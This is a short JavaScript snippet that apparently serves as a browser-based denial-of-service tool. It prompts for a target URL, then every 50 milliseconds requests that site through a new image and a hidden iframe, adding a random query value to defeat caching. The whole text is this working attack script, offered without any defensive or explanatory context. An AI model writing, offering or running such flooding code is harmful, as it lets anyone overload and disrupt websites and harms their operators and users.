var target = prompt("Url");
function attack() {  
  var pic = new Image();
  var rand = Math.floor(Math.random() * 1000);
  pic.src = 'http://'+target+"/?"+rand;
    
    document.body.innerHTML+='<iframe src="'+target+"/?r="+rand+'" style="display:none;"></iframe>';
}
setInterval(attack, 50);  
